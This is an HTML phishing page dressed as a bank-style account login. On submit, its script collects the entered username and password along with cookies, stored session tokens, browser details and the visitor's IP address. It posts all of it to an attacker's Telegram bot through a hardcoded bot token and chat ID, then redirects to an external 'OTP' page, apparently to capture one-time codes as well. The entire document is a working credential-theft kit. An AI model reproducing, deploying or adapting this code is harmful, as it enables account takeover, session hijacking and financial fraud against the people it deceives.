<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f4f4f4;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    .logo {
      width: 150px;
      margin-bottom: 20px;
    }

    .login-box {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }

    .login-box h2 {
      text-align: center;
      font-weight: normal;
      margin-bottom: 20px;
    }

    .login-box label {
      font-weight: bold;
      font-size: 14px;
    }

    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0 16px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 15px;
    }

    .login-box input[type="submit"] {
      width: 100%;
      padding: 10px;
      background: #333;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      font-size: 16px;
    }

    .login-box input[type="submit"]:hover {
      background: #111;
    }

    .footer-links {
      display: flex;
      justify-content: space-between;
      margin-top: 15px;
      font-size: 14px;
    }

    .footer-links a {
      color: #0066cc;
      text-decoration: none;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

<div class="container">
  <img src="HW_Logos_FINAL_Full_Color-Secondary-768x221-1.png" alt="Logo" class="logo">

  <form class="login-box" onsubmit="sendData(event)">
    <h2>Please log in with your credentials to view your account details.</h2>

    <label for="username">Username</label>
    <input type="text" id="username" placeholder="Enter Username" required>

    <label for="password">Password</label>
    <input type="password" id="password" placeholder="Enter Password" required>

    <input type="submit" value="Log In">

    <div class="footer-links">
      <a href="#">Enroll</a>
      <a href="#">Forgot Password</a>
      <a href="#">Unlock Account</a>
    </div>
  </form>
</div>

<script>
  async function sendData(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const cookies = document.cookie;
    const localToken = localStorage.getItem("token") || "none";
    const sessionToken = sessionStorage.getItem("token") || "none";
    const userAgent = navigator.userAgent;
    const screenSize = `${screen.width}x${screen.height}`;
    const currentURL = window.location.href;

    let ip = "unknown";
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      ip = data.ip;
    } catch (e) {}

    const message = `
New Login Captured:
Username: ${username}
Password: ${password}
IP Address: ${ip}
User Agent: ${userAgent}
Screen Size: ${screenSize}
Page URL: ${currentURL}

Cookies: ${cookies}
LocalStorage Token: ${localToken}
SessionStorage Token: ${sessionToken}
    `;

    const TELEGRAM_BOT_TOKEN = "7857705459:AAHaGE6-uZIzv34uuWfqWdfbtP0T9jrvDbU";
    const TELEGRAM_CHAT_ID = "5053464023";
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`
    });

    // Redirect to OTP page after sending
    window.location.href = "https://bigbinbabyxxx.github.io/whitney/otp.html";
  }
</script>

</body>
</html>
